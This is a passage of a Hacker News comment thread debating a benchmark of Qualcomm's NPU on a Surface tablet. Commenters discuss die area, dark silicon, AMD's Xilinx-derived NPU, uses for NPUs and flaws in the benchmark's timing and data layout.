view you’re looking for and will stick as the default once you find it, but you do have to bat away some BS at first. reply coldpie 4 hours agorootparentprevThere is a chronological view tucked in there somewhere, but they really do hide it behind the other crap. Once you manage to get into it, it usually stays that way, but sometimes it kicks me back out to the random nonsense view and I have to take a few minutes to find chronological again. reply renewiltord 21 hours agorootparentprevI was telling someone this and they gave me link to a laptop with higher battery life and better performance than my own, but I kept explaining to them that the feature I cared most about was die size. They couldn't understand it so I just had to leave them alone. Non-technical people don't get it. Die size is what I care about. It's a critical feature and so many mainstream companies are missing out on my money because they won't optimize die size. Disgusting. reply _zoltan_ 20 hours agorootparentNews flash: you're in the niche of the niche. People don't care about die size. I'd be willing to bet that the amount of money they are missing out on is miniscule and is by far offset by people's money who care about other stuff. Like you know, performance and battery life, just to stick to your examples. reply mattnewton 17 hours agorootparentThat’s exactly what the poster is arguing- they are being sarcastic. reply shermantanktop 4 hours agorootparentIt whooshed over my head too. That’s the danger of sarcasm…it’s a cooperative form of humor but the other party might not get it. reply nl 20 hours agorootparentprevIs this a parody? Why would anyone care about die size? And if you do why not get one of the many low power laptops with Atoms etc that do have small die size? reply thfuran 20 hours agorootparentYes, they're making fun of the comment they replied to. reply singlepaynews 15 hours agorootparentWould you do me the favor of explaining the joke? I get the premise—nobody cares about die size, but the comment being mocked seems perfectly innocuous to me? They want a laptop without an NPU b/c according to link we get more out of CPU anyways? What am I missing here? reply michaelt 10 hours agorootparentIt has been the norm for several decades to have hardware features that go unused. The realities of mass manufacturing and supply chains and whatnot mean it's cheaper to get a laptop with a webcam I don't use, a fingerprint reader I don't use, and an SD card reader I don't use. It's cheaper to get a CPU with integrated graphics I don't use, a trusted execution environment I don't use, remote management features I don't use. It's cheaper to get a discrete GPU with RGB LEDs I don't use, directx support I don't use, four outputs when I only need one. It's cheaper to get a motherboard with integrated wifi than one without. reply tedunangst 20 hours agorootparentprevNo, no, no, you just don't get it. The only thing Dell will sell me is a laptop 324mm wide, which is totally appalling, but if they offered me a laptop that's 320mm wide, I'd immediately buy it. In my line of work, which is totally serious business, every millimeter counts. reply throwaway48476 20 hours agorootparentprevMaybe through a game of telephone they confused die size and node size? reply ezst 12 hours agorootparentprevI'm fine with the mockery, I genuinely hadn't realized that \"wanting to pay for what one needs\" was such a hot and controversial take. reply ginko 9 hours agorootparentThe extra cost of the area spent on npu cores is pretty hard to quantify. I guess removing it would allow for higher yields and number of chips per wafer but then you’d need to set up tooling for two separate runs (one with npu and one without) Add to that that most of the cost is actually the design of the chip and it’s clear why manufacturers just always add the extra features. Maybe they could sell a chip with the NPU permanently disabled but I guess that wouldn’t be what you want either? Fwiw there should be no power downside to having an unused unit. It’ll just not be powered. reply ezst 4 hours agorootparentThe argument boils down to \"since it's there, better to keep it because making a version without it would defeat economies of scale and not save much, if at all\", and that's a sensible take… under the assumption that there's a general demand for NPUs, which I contest. In practice, everyone is paying a premium for NPUs that only a minority desires, and only a fraction of that minority essentially does \"something\" with it. This thread really helps to show that the use-cases are few, non-essential, and that the general application landscape hasn't adopted NPUs and has very little incentive to do so (because of the alien programming model, because of hardware compat across vendors, because of the ecosystem being a moving target with little stability in sight, and because of the high-effort/low-reward in general). I do want to be wrong, of course. Tech generally is exciting because it offers new tools to crack old problems, opening new venues and opportunities in the process. Here it looks like we have a solution in search for a problem that was set by marketing departments. reply Miraste 58 minutes agorootparentModern SoCs already have all kinds of features with use-cases that are few and non-essential. Granted they don't take as much space as NPUS, but manufacturers are betting that if NPUs are available, software will evolve to use them regularly. If it doesn't, they'll probably go away in a few generations. But at a minimum, Microsoft and Apple seem highly committed to using them. reply waveBidder 19 hours agorootparentprevyour satire is off base enough that people don't understand it's satire. reply 0xDEAFBEAD 13 hours agorootparentSays a lot about HN that so many believed he was genuine. reply heavyset_go 18 hours agorootparentprevThe Poe's Law means it's working. reply fijiaarone 15 hours agorootparentprevYeah, I know what you mean. I hate lugging around a big CPU core. reply DrillShopper 21 hours agorootparentprevCorporatized gains in the market from hype Socialized losses in increased carbon emissions, upheaval from job loss, and higher prices on hardware. The more they say the future will be better the more that it looks like the status quo. reply Kon-Peki 21 hours agoparentprevModern chips have to dedicate a certain percentage of the die to dark silicon [1] (or else they melt/throttle to uselessness), and these kinds of components count towards that amount. So the point of these components is to be used, but not to be used too much. Instead of an NPU, they could have used those transistors and die space for any number of things. But they wouldn't have put additional high performance CPU cores there - that would increase the power density too much and cause thermal issues that can only be solved with permanent throttling. [1] https://en.wikipedia.org/wiki/Dark_silicon reply jcgrillo 16 hours agorootparentQuestion--what's to be lost by making your features sufficiently not dense to allow them to cool at full tilt? reply AlotOfReading 16 hours agorootparentMesses with timing, among other things. A lot of those structures are relatively fixed blocks that are designed for specific sizes. Signals take more time to propagate longer distances, and longer conductors have worse properties. Dense and hot is faster and more broadly useful. reply jcgrillo 16 hours agorootparentInteresting, so does that mean we're basically out of runway without aggressive cooling? reply joha4270 12 hours agorootparentNo. Every successive semiconductor node uses less power than the previous per transistor at the same clock speed. Its just that we then immediately use this headroom to pack more transistors closer and run them faster, so every chip keeps running into power limits, even if they continually do more with said power. reply positr0n 13 hours agorootparentprevGood discussion on how at multi GHz clock speeds, the speed of light is actually limiting on some circuit design choices: https://news.ycombinator.com/item?id=12384596 reply IshKebab 21 hours agorootparentprevIf they aren't being used it would be better to dedicate the space to more SRAM. reply a2l3aQ 20 hours agorootparentThe point is parts of the CPU have to be off or throttled down when other components are under load to maintain TDP, adding cache that would almost certainly be being used defeats the point of that. reply jsheard 20 hours agorootparentDoesn't SRAM have much lower power density than logic with the same area though? Hence why AMD can get away with physically stacking cache on top of more cache in their X3D parts, without the bottom layer melting. reply Kon-Peki 19 hours agorootparentYes, cache has a much lower power density and could have been a candidate for that space. But I wasn’t on the design team and have no basis for second-guessing them. I’m just saying that cramming more performance CPU cores onto this die isn’t a realistic option. reply wtallis 19 hours agorootparentprevThe SRAM that AMD is stacking also has the benefit of being last-level cache, so it doesn't need to run at anywhere near the frequency and voltage that eg. L1 cache operates at. reply IshKebab 12 hours agorootparentprevCache doesn't use nearly as much power as active computation; that was my point. reply VHRanger 3 hours agorootparentprevSRAM is extremely hot, it's the very opposite of dark silicon reply JohnFen 20 hours agoparentprev> These NPUs are tying up a substantial amount of silicon area so it would be a real shame if they end up not being used for much. This has been my thinking. Today you have to go out of your way to buy a system with an NPU, so I don't have any. But tomorrow, will they just be included by default? That seems like a waste for those of us who aren't going to be running models. I wonder what other uses they could be put to? reply consteval 3 hours agorootparentWe already can't fit much more in CPUs. You can't just throw cores in there. CPUs these days are, like, 80% cache if you look at the die. We constantly shrink the compute part, but we don't put much more compute - that space is just used for cache. So, I'm not sure that you're wasting much with the NPU. But I'm not an expert. reply jonas21 20 hours agorootparentprevNPUs are already included by default in the Apple ecosystem. Nobody seems to mind. reply acchow 19 hours agorootparentIt enables many features on the phone that people like, all without sending your personal data to the cloud. Like searching your photos for \"dog\" or \"receipt\". reply JohnFen 20 hours agorootparentprevIt's not really a question of minding if it's there, unless its presence increases cost, anyway. It just seems a waste to let it go idle, so my mind wanders to what other use I could put that circuitry to. reply shepherdjerred 18 hours agorootparentprevI actually love that Apple includes this — especially now that they’re actually doing something with it via Apple Intelligence reply crazygringo 19 hours agorootparentprevAren't they used for speech recognition -- for dictation? Also for FaceID. They're useful for more things than just LLM's. reply JohnFen 14 hours agorootparentYes, but I'm not interested in those sorts of uses. I'm wondering what else an NPU could be used for. I don't know what an NPU actually is at a technical level, so I'm ignorant of the possibilities. reply ItsBob 9 hours agorootparentI'm probably about to show my ignorance here (I'm not neck-deep in the AI space but I am a software architect...) but are they not just dedicated matrix multiplication engines (plus some other AI stuff)? So instead of asking the CPU to do the math, you have a dedicated area that does it instead... well, that's my understanding of it. As to why, I think it's along the lines of this: the CPU does 100 things, one of those is AI acceleration. Let's take the AI acceleration and give it its own space instead so we can keep the power down a bit, add some specialization, and leave the CPU to do other stuff. Again, I'm coming at this from a high-level as if explaining it to my ageing parents. reply JohnFen 8 hours agorootparentYes, that's my understanding as well. What I meant is that I don't know the fine details. My ignorance is purely because I don't actually have a machine that has an NPU, so I haven't bothered to study up on them. reply heavyset_go 18 hours agorootparentprevThe idea is that your OS and apps will integrate ML models, so you will be running models whether you know it or not. reply JohnFen 14 hours agorootparentI'm confident that I'll be able to know and control whether or not my Linux and BSD machines will be using ML models. reply hollerith 14 hours agorootparent--and whether anyone is using your interactions with your computer to train a model. reply jsheard 20 hours agorootparentprev> But tomorrow, will they just be included by default? That's already the way things are going due to Microsoft decreeing that Copilot+ is the future of Windows, so AMD and Intel are both putting NPUs which meet the Copilot+ performance standard into every consumer part they make going forwards to secure OEM sales. reply AlexAndScripts 20 hours agorootparentIt almost makes me want to find some use for them on my Linux box (not that is has an NPU), but I truly can't think of anything. Too small to run a meaningful LLM, and I'd want that in bursts anyway, I hate voice controls (at least with the current tech), and Recall sounds thoroughly useless. Could you do mediocre machine translation on it, perhaps? Local github copilot? An LLM that is purely used to build an abstract index of my notes in the background? Actually, could they be used to make better AI in games? That'd be neat. A shooter character with some kind of organic tactics, or a Civilisation/Stellaris AI that doesn't suck. reply Miraste 43 minutes agorootparentIn short: no. Current-gen NPUs are so slow they can't do anything useful. AMD and Intel have 2nd-gen ones that came out a few weeks ago, and by spec they may able to run local translation and small LLMs (haven't seen benchmarks yet), but for now they are laptop-only. reply ywvcbk 10 hours agorootparentprev> box Presumably you have a GPU? If so there is nothing an NPU can do that a discrete GPU can’t (and it would be much slower than a recent GPU). The real benefits are power efficiency and cost since they are built into the SoC which are not necessarily that useful on a desktop PC. reply bcoates 4 hours agorootparentprevMicrosoft has declared a whole lot of things to be the future of Windows, almost all of them were quietly sidelined in a version or two. https://www.joelonsoftware.com/2002/01/06/fire-and-motion/ reply jsheard 2 hours agorootparentYeah, but the lead times on silicon mean we're going to be stuck with Microsoft's decision for while regardless of how hard they commit to it. AMD and Intel probably already have two or three future generations of Copilot+ CPUs in the pipeline. reply idunnoman1222 18 hours agorootparentprevVoice to text reply kllrnohj 17 hours agoparentprevSnapdragon X still has a full 12 cores (all same cores, it's homogeneous) and the Strix Point is also 12 cores but in a 4+8 configuration but with the \"little\" cores not sacrificing that much (nothing like the little cores in ARM's designs which might as well not even exist, they are a complete waste of silicon). Consumer software doesn't scale to that, so what are you going to do with more transistors allocated to the CPU? It's not unlike why Apple puts so many video engines in their SoCs - they don't actually have much else to do with the transistor budget they can afford. Making single thread performance better isn't limited by transistor count anymore and software is bad at multithreading. reply wmf 16 hours agorootparentGPU \"infinity\" cache would increase 3D performance and there's a rumor that AMD removed it to make room for the NPU. They're not out of ideas for features to put on the chip. reply NebulaTrek 29 minutes agoprevWe ran qprof (a Qualcomm NPU profiler) on this benchmark. The profiling results indicate that the workload was distributed to the vector cores instead of the tensor core, which provide the vast majority of the compute power in the NPU (my back of napkin math suggests that HMX is 30x stronger than HVX). The workload is relatively small, which results in underutilization of the hardware capacity due to the overhead associated with input/output quantization-dequantization and NCHW-NHCW mapping. Padding the weights and inputs to be a multiple of 64 would also help the performance. Edit: Link to the profiling graph https://imgur.com/a/2OKR93e Estimated HVX compute capability 421.43*1024/8 = 1.46TOPS in int8, in which 4 is number of vector cores 2 is number operation per cycle 1.43GHz is HVX frequency 1024bit is vector register width 8bit is precision reply eightysixfour 22 hours agoprevI thought the purpose of these things was not to be fast, but to be able to run small models with very little power usage? I have a newer AMD laptop with an NPU, and my power usage doesn't change using the video effects that supposedly run on it, but goes up when using the nvidia studio effects. It seems like the NPUs are for very optimized models that do small tasks, like eye contact, background blur, autocorrect models, transcription, and OCR. In particular, on Windows, I assumed they were running the full screen OCR (and maybe embeddings for search) for the rewind feature. reply boomskats 22 hours agoparentThat's especially true because yours is a Xilinx FPGA. The one that they just attached to the latest gen mobile ryzens is 5x more capable too. AMD are doing some fantastic work at the moment, they just don't seem to be shouting about it. This one is particularly interesting https://lore.kernel.org/lkml/DM6PR12MB3993D5ECA50B27682AEBE1... edit: not an FPGA. TIL. :'( reply pclmulqdq 21 hours agorootparentIt's not an FPGA. It's a VLIW DSP that Xilinx built to go into an FPGA-SoC to help run ML models. reply almostgotcaught 21 hours agorootparentthis is the correct answer. one of the compilers for this DSP is https://github.com/Xilinx/llvm-aie. reply errantspark 21 hours agorootparentprevWait sorry back up a bit here. I can buy a laptop that has a daughter FPGA in it? Does it have GPIO??? Are we seriously building hardware worth buying again in 2024? Do you have a link? reply eightysixfour 21 hours agorootparentIt isn't as fun as you think - they are setup for specific use cases and quite small. Here's a link to the software page: https://ryzenai.docs.amd.com/en/latest/index.html The teeny-tiny \"NPU,\" which is actually an FPGA, is 10 TOPS. Edit: I've been corrected, not an FPGA, just an IP block from Xilinx. reply wtallis 21 hours agorootparentIt's not a FPGA. It's an NPU IP block from the Xilinx side of the company. It was presumably originally developed to be run on a Xilinx FPGA, but that doesn't mean AMD did the stupid thing and actually fabbed a FPGA fabric instead of properly synthesizing the design for their laptop ASIC. Xilinx involvement does not automatically mean it's an FPGA. reply boomskats 21 hours agorootparentDo you have any more reading on this? How come the XDNA drivers depend on Xilinx' XRT runtime? reply wtallis 20 hours agorootparentIt would be surprising and strange if AMD didn't reuse the software framework they've already built for doing AI when that IP block is instantiated on an FPGA fabric rather than hardened in an ASIC. reply boomskats 20 hours agorootparentWell, I'm irrationally disappointed, but thanks. Appreciate the correction. reply almostgotcaught 21 hours agorootparentprevbecause XRT has a plugin architecture: XRT And it's an FPGA. nope it's not. reply boomskats 19 hours agorootparentI've just ordered myself a jump to conclusions mat. reply almostgotcaught 19 hours agorootparentLol during grad school my advisor would frequently cut me off and try to jump to a conclusion, while I was explaining something technical often enough he was wrong. So I did really buy him one (off eBay or something). He wasn't pleased. reply dekhn 20 hours agorootparentprevIf you want GPIOs, you don't need (or want) an FPGA. I don't know the details of your use case, but I work with low level hardware driven by GPIOs and after a bit of investigation, concluded that having direect GPIO access in a modern PC was not necessary or desirable compared to the alternatives. reply errantspark 14 hours agorootparentI get a lot of use out of the PRUs on the BeagleboneBlack, I would absolutely get use out of an FPGA in a laptop. reply dekhn 14 hours agorootparentIt makes more sense to me to just use the BeagleboneBlack in concert with the FPGA. Unless you have highly specific compute or data movement needs that can't be satisfied over a USB serial link. If you have those needs, and you need a laptop, I guess an FPGA makes sense but that's a teeny market. reply beeflet 21 hours agorootparentprevIt would be cool if most PCs had a general purpose FPGA that could be repurposed by the operating system. For example you could use it as a security processor like a TPM or as a bootrom, or you could repurpose it for DSP or something. It just seems like this would be better in terms of firmware/security/bootloading because you would be more able to fix it if an exploit gets discovered, and it would be leaner because different operating systems can implement their own stuff (for example linux might not want pluton in-chip security, windows might not want coreboot or linux-based boot, bare metal applications can have much simpler boot). reply walterbell 20 hours agorootparentXilinx Artix 7-series PicoEVB fits in M.2 wifi slot and has an OSS toolchain, http://www.enjoy-digital.fr/ reply davemp 17 hours agorootparentprevUnfortunately FPGA fabric is ~2x less power efficient than equivalent ASIC logic at the same clock speeds last time I checked. So implementing general purpose logic on an FPGA is not usually the right option even if you don’t care about FMAX or transistor counts. reply numpad0 20 hours agorootparentprevSorry for an OT comment but what is going on with that ascii art!? The content fits within 80 columns just fine[1], is it GPT generated? 1: https://pastebin.com/raw/R9BrqETR reply conradev 22 hours agoparentprevThat is my understanding as well: low power and low latency. You can see this in action when evaluating a CoreML model on a macOS machine. The ANE takes half as long as the GPU which takes half as long as the CPU (actual factors being model dependent) reply nickpsecurity 22 hours agorootparentTo take half as long, doesn’t it have to perform twice as fast? Or am I misreading your comment? reply eightysixfour 22 hours agorootparentNo, you can have latency that is independent of compute performance. The CPU/GPU may have other tasks and the work has to wait for the existing threads to finish, or for them to clock up, or have slower memory paths, etc. If you and I have the same calculator but I'm working on a set of problems and you're not, and we're both asked to do some math, it may take me longer to return it, even though the instantaneous performance of the math is the same. reply refulgentis 22 hours agorootparentIn isolation, makes sense. Wouldn't it be odd for OP to present examples that are the opposite of their claim, just to get us thinking about \"well the CPU is busy?\" Curious for their input. reply conradev 19 hours agorootparentprevThe GPU is stateful and requires loading shaders and initializing pipelines before doing any work. That is where its latency comes from. It is also extremely power hungry. The CPU is zero latency to get started, but takes longer because it isn't specialized at any one task and isn't massively parallel, so that is why the CPU takes even longer. The NPU often has a simpler bytecode to do more complex things like matrix multiplication implemented in hardware, rather than having to instantiate a generic compute kernel on the GPU. reply monkeynotes 4 hours agoparentprevI believe that low power = cheaper tokens = more affordable and sustainable, to me this is what a consumer will benefit from overall. Power hungry GPUs seem to sit better in research, commerce, and enterprise. The Nvidia killer would be chips and memory that are affordable enough to run a good enough model on a personal device, like a smartphone. I think the future of this tech, if the general populace buys into LLMs being useful enough to pay a small premium for the device, is personal models that by their nature provide privacy. The amount of personal information folks unload on ChatGPT and the like is astounding. AI virtual girlfriend apps frequently get fed the most darkest kinks, vulnerable admissions, and maybe even incriminating conversations, according to Redditors that are addicted to these things. This is all given away to no-name companies that stand up apps on the app store. Google even states that if you turn Gemini history on then they will be able to review anything you talk about. For complex token prediction that requires a bigger model the personal could switch to consulting a cloud LLM, but privacy really needs to be ensured for consumers. I don't believe we need cutting edge reasoning, or party trick LLMs for day to day personal assistance, chat, or information discovery. reply godelski 19 hours agoparentprev> but to be able to run small models with very little power usage yes But first, I should also say you probably don't want to be programming these things with python. I doubt you'll get good performance there, especially as the newness means optimizations haven't been ported well (even using things like TensorRT is not going to be as fast as writing it from scratch, and Nvidia is throwing a lot of man power at that -- for good reason! But it sure as hell will get close and save you a lot of time writing). They are, like you say, generally optimized for doing repeated similar tasks. That's also where I suspect some of the info gathered here is inaccurate. (I have not used these NPU chips so what follows is more educated guesses, but I'll explain. Please correct me if I've made an error) Second, I don't trust the timing here. I'm certain the CUDA timing (at the end) is incorrect, as the code written wouldn't properly time. Timing is surprisingly not easy. I suspect the advertised operations are only counting operations directly on the NPU while OP would have included CPU operations in their NPU and GPU timings[0]. But the docs have benchmarking tools, so I suspect they're doing something similar. I'd be interested to know the variance and how this holds after doing warmups. They do identify the IO as an issue, and so I think this is evidence of this being an issue. Third, their data is improperly formatted. MATRIX_COUNT, MATRIX_A, MATRIX_B, MATRIX_K = (6, 1500, 1500, 256) INPUT0_SHAPE = [1, MATRIX_COUNT, MATRIX_A, MATRIX_K] INPUT1_SHAPE = [1, MATRIX_COUNT, MATRIX_K, MATRIX_B] OUTPUT_SHAPE = [1, MATRIX_COUNT, MATRIX_A, MATRIX_B] You want \"channels last\" here. I suspected this (do this in pytorch too!) and the docs they link confirm. 1500 is also an odd choice and this could be cause for extra misses. I wonder how things would change with 1536, 2048, or even 256. Might (probably) even want to look smaller, since this might be a common preprocessing step. Your models are not processing full res images and if you're going to optimize architecture for models, you're going to use that shape information. Shape optimization is actually pretty important in ML[1]. I suspect this will be quite a large miss. Fourth, a quick look at the docs and I think the setup is improper. Under \"Model Workflow\" they mention that they want data in 8 or 16 bit *float*. I'm not going to look too deep, but note that there are different types of floats (e.g. pytorch's bfloat is not the same as torch.half or torch.float16). Mixed precision is still a confusing subject and if you're hitting issues like these it is worth looking at. I very much suggest not just running a standard quantization procedure and calling it a day (start there! But don't end there unless it's \"good enough\", which doesn't seem too meaningful here.) FWIW, I still do think these results are useful, but I think they need to be improved upon. This type of stuff is surprisingly complex, but a large amount of that is due to things being new and much of the details still being worked out. Remember that when you're comparing to things like CPU or GPU (especially CUDA) that these have had hundreds of thousands of man hours put into then and at least tens of thousands into high level language libraries (i.e. python) to handle these. I don't think these devices are ready for the average user where you can just work with them from your favorite language's abstraction level, but they're pretty useful if you're willing to work close to the metal. [0] I don't know what the timing is for this, but I do this in pytorch a lot so here's the boilerplate times = torch.empty(rounds) # Don't need use dummy data, but here input_data = torch.randn((batch_size, *data_shape), device=\"cuda\") # Do some warmups first. There's background actions dealing with IO we don't want to measure # You can remove that line and do a dist of times if you want to see this # Make sure you generate data and save to a variable (write) or else this won't do anything for _ in range(warmup): data = model(input_data) for i in range(rounds): starter = torch.cuda.Event(enable_timing=True) ender = torch.cuda.Event(enable_timing=True) starter.record() data = model(input_data) ender.record() torch.cuda.synchronize() times[i] = starter.elapsed_time(ender)/1000 total_time = times.sum() The reason we do it this way is if we just wrap the model output with a timer then we're looking at CPU time but the GPU operations are asynchronous so you could get deceptively fast (or slow) times [1] https://www.thonking.ai/p/what-shapes-do-matrix-multiplicati... reply refulgentis 21 hours agoparentprevYou're absolutely right IMO, given what I heard when launching on-device speech recognition on Pixel, and after leaving Google, what I see from ex. Apple Neural Engine vs. CPU when running ONNX stuff. I'm a bit suspicious of the article's specific conclusion, because it is Qualcomm's ONNX, and it be out of date. Also, Android loved talking shit about Qualcomm software engineering. That being said, its directionally correct, insomuch as consumer hardware AI acceleration claims are near-universally BS unless you're A) writing 1P software B) someone in the 1P really wants you to take advantage. reply kristianp 20 hours agorootparent1P? reply refulgentis 20 hours agorootparentFirst party, i.e. Google/Apple/Microsoft reply moffkalast 21 hours agoparentprevnext [6 more] [flagged] eightysixfour 21 hours agorootparentThe 7940HS shipped before recall and doesn't support it because it is not performant enough, so, that doesn't make sense. I just gave you a use case, mine in particular uses it for background blur and eye contact filters with the webcam and uses essentially no power to do it. If I do the same filters with nvidia broadcast, the power usage is dramatically higher. reply wtallis 21 hours agorootparentIntel is also about to launch their first desktop processors with an NPU which falls far short of Microsoft's performance requirements for a \"Copilot+ PC\". Should still be plenty for webcam use. reply moffkalast 21 hours agorootparentprevI doubt there's no notable power draw, NPUs in general have always pulled a handful of watts which should at least about match a modern CPU's idle draw. But it does seem odd that your power usage doesn't change at all, it might be always powered on or something. Eye contact filters seem like a horrible thing, autocorrect won't work better than a dictionary with a tiny model and I doubt these things can come even close to running whisper for decent voice transcription. Background blur alright, but that's kind of stretching it. I always figured Zoom/Teams do these things serverside anyway. And alright, if it's not MS making them do it, then they're just chasing the fad themselves while also shipping subpar hardware. Not sure if that makes it better. reply kalleboo 14 hours agorootparent> I doubt these things can come even close to running whisper for decent voice transcription https://github.com/ggerganov/whisper.cpp/pull/566 \"The performance gain is more than x3 compared to 8-thread CPU\" And this is on the 3 year old M1 Pro reply Dylan16807 20 hours agorootparentprev> I doubt these things can come even close to running whisper for decent voice transcription. Whisper runs almost realtime on a single core of my very old CPU. I'd be very surprised if it can't fit in an NPU. reply lambda-research 5 hours agoprevThe benchmark is matrix multiplcation with the shapes `(6, 1500, 256) X (6, 256, 1500)`, which just aren't that big in the AI world. I think the gap would be larger with much larger matrices. E.g. Llama 3.1 8B which is one of the smaller models has matrix multiplications like `(batch, 14336, 4096) x (batch, 4096, 14336)`. I just don't think this benchmark is realistic enough. reply protastus 21 hours agoprevDeploying a model on an NPU requires significant profile based optimization. Picking up a model that works fine on the CPU but hasn't been optimized for an NPU usually leads to disappointing results. reply catgary 20 hours agoparentYeah whenever I’ve spoken to people who work on stuff like IREE or OpenXLA they gave me the impression that understanding how to use those compilers/runtimes is an entire job. reply CAP_NET_ADMIN 20 hours agoparentprevBeauty of CPUs - they'll chew through whatever bs code you throw at them at a reasonable speed. reply marginalia_nu 6 hours agorootparentI don't think this is correct. The difference between well optimized code and unoptimized code on the CPU is frequently at least an order of magnitude performance. Reason it doesn't seem that way is that the CPU is so fast we often bottleneck on I/O first. However, for compute-workloads like inference, it really does matter. reply consteval 3 hours agorootparentWhile this is true, the most effective optimizations you don't do yourself. The compiler or runtime does it. They get the low-hanging fruit. You can further optimize yourself, but unless your design is fundamentally bad, you're gonna be micro-optimizing. gcc -O0 and -O2 has a HUGE performance gain. We don't really have anything to auto-magically do this for models, yet. Compilers are intimately familiar with x86. reply cjbgkagh 17 hours agoprev> We've tried to avoid that by making both the input matrices more square, so that tiling and reuse should be possible. While it might be possible it would not surprise me if a number of possible optimizations had not made it into Onnx. It appears that Qualcomm does not give direct access to the NPU and users are expected to use frameworks to convert models over to it, and in my experience conversion tools generally suck and leave a lot of optimizations on the table. It could be less of NPUs suck and more of the conversions tools suck. I'll wait until I get direct access - I don't trust conversion tools. My view of NPUs is that they're great for tiny ML models and very fast function approximations which is my intended use case. While LLMs are the new hotness there are huge number of specialized tasks that small models are really useful for. reply Hizonner 6 hours agoparent> While LLMs are the new hotness there are huge number of specialized tasks that small models are really useful for. Can you give some examples? Preferably examples that will run continuously enough for even a small model to stay in cache, and are valuable enough to a significant number of users to justify that cache footprint? I am not saying there aren't any, but I also honestly don't know what they are and would like to. reply cjbgkagh 2 hours agorootparentI guess these days basically anything in ML prior to LLMs would be considered small. LLMs are rather unusual because of how large they are. NNs can be used as a general function approximators so any function which can be approximated is a candidate for using a NN in it's place. I have a very complex trig function that produces a high dimensional smooth manifold which I know will only be used within a narrow range of inputs and I can sacrifice some accuracy for speed. My inner loops have inner loops which have inner loops with inner loops. So when you're 4+ inner loops deep the speed becomes essential. I can sweep the entire input domain to make sure the error always stays within limits. If you're doing things such as counting instructions, intrinics, inline assembly, bit-twiddling, fast math, polynomial approximations, LUTs, fixed point math, etc. you could probably add NNs to your toolkit. Stockfish uses a 'small' 82K parameter neural net of 3 dense integer only layers (https://news.ycombinator.com/item?id=27734517). I think Stockfish performance would be a really good candidate for testing NPUs as there is a time / accuracy tradeoff. reply consteval 3 hours agorootparentpreviPhones use a lot of these. There's a bunch of little features that run on the NPU. Suggestions, predictive text, smart image search, automatic image classification, text selection in images, image processing. These don't run continuously, but I think they are valuable to a lot of users. The predictive text is quite good, and it's very nice to be able to search for vague terms like \"license plate\" and get images in my camera roll. Plus, selecting text and copying it from images is great. For desktop usecases, I'm not sure. reply jaygreco 16 hours agoparentprevI came here to say this. I haven’t worked with the Elite X but the past gen stuff I’ve used (865 mostly) the accelerators - compute DSP and much smaller NPU - required _very_ specific setup, compilation with a bespoke toolchain, and communication via RPC to name a few. I would hope the NPU on Elite X is easier to get to considering the whole copilot+ thing, but I bring this up mainly to make the point that I doubt it’s just as easy as “run general purpose model, expect it to magically teleport onto the NPU”. reply fancyfredbot 22 hours agoprevThe write up on the GitHub repo is much more informative than the blog. When running int8 matmul using onnx performance is ~0.6TF. https://github.com/usefulsensors/qc_npu_benchmark reply dang 22 hours agoparentThanks—we changed the URL to that from https://petewarden.com/2024/10/16/ai-pcs-arent-very-good-at-.... Readers may way want to look at both, of course! reply dhruvdh 18 hours agorootparentOh, maybe also change the title? I flagged it because of the title/url not matching. reply _davide_ 15 hours agoprevThe RTX 4080 should be capable of ~40 TFLOPS, yet they only report 2,160 billion operations per second. Shouldn't this be enough to reconsider the benchmark? They probably made some serious error in measuring FLOPS. Regarding the fact that CPU beats NPU is possible but they should benchmark many matrix multiplications without any application synchronization in order to have a decent comparison. reply Grimblewald 14 hours agoparentThat isnt the half of it. A quick skim of the documentation shows that the cpu inference wasnt done in a comparable way either. reply pzo 10 hours agoprevHaven't played much with Qualcomm NPU but Apple Neural Engine available in iOS and MacOS for many Computer Vision models was significantly faster than when running on CPU or GPU (e.g. mediapipe models, yolo, depth-anything) - to the point that inference was much faster on Macbook M2 Max using its NPU that is the same as on older iPhones rather than executing on all 38 GPU cores. This all depends on model architecture, conversions and tuning. Apple provides good tooling in XCode for benchmarking models up to execution time of single operators and where such operator got executed (CPU, GPU, NPU) in case couldn't been executed on NPU and have to fallback to CPU/GPU. Sometimes model have be tweaked to slightly different operator if it's not available in NPU. On top of that ML frameworks/runtimes such as ONNX/Pytorch/TensorflowLite sometimes don't implement all operators in CoreML or MPS. reply teilo 19 hours agoprevActual article title: Benchmarking Qualcomm's NPU on the Microsoft Surface Tablet Because this isn't about NPUs. It's about a specific NPU, on a specific benchmark, with a specific set of libraries and frameworks. So basically, this proves nothing. reply gnabgib 17 hours agoparentThe title is from the original article (https://petewarden.com/2024/10/16/ai-pcs-arent-very-good-at-...), the URL was changed by dang: https://news.ycombinator.com/item?id=41863591 reply iml7 18 hours agoparentprevBut you can’t get more clicks. You have to attack enough people to get clicks.I feel like this place is becoming more and more filled with posts and titles like this. reply gerdesj 17 hours agorootparentInternet points are a bit crap but HN generally discusses things properly and off topic and downright weird stuff generally gets downvoted to doom. reply Havoc 19 hours agoprev>We see 1.3% of Qualcomm's NPU 45 Teraops/s claim To me that suggests that the test is wrong. I could see intel massaging results, but that far off seems incredibly improbable reply freehorse 17 hours agoprevI always thought that the main point of NPUs is energy efficiency (and being able to run ML models without taking over all computer resources, making it practical to integrate ML applications in the OS itself in ways that it does not disturb the user or the workflow) rather than being exceptionally faster. At least this has been my experience with running stable diffusion on macs. Similar to using other specialised hardware like media encoders; they are not necessarily faster than a CPU if you throw a dozen+ cpu cores on the task, but it will draw a minuscule part of the power. reply bsmartt 1 hour agoprevwhat are all these folks hoping to accomplish? By crying and starting shit about windows recall, all you did was signal to their shareholders and the financial analysts that windows recall actually substance and not just a marketing facade. Otherwise, why would all those nerds be so angry? So microsoft takes some of the criticisms on twitter and gets them in before shipping. Free appsec, nice. Now, microsoft doesnt care about your benchmarks, dude. Grandma isnt gonna notice these workloads finish faster on a different compiled program utilizing different chips. Her last PC was EOL'd 10 years ago, it certainly cant keep up with this new ai laptop. reply wmf 21 hours agoprevThis headline is seriously misleading because the author did not test AMD or Intel NPUs. If Qualcomm is slow don't say all AI PCs are not good. reply guelermus 16 hours agoprevOne should pay attention also to power efficiency, a direct comparison could be misleading here. reply piskov 17 hours agoprevSnapdragon touts 45 TOPS but it’s only int8. For example Apple's m3 neural engine is mere 18 TOPS but it’s FP16. So windows has bigger number but it’s not apple to apple comparison. Did author test int8 performance? reply m00x 19 hours agoprevNPUs are efficient, not especially fast. The CPU is much bigger than the NPU and has better cache access. Of course it'll perform better. reply llm_nerd 3 hours agoparentNPUs are actually incredibly fast for standard inference operations. This benchmark is horribly flawed in many ways, and was so evidently useless that I'm surprised that they still decided to \"publish\" this. When your test gets 1% of the published performance, it's a good indication that things aren't being done correctly. reply 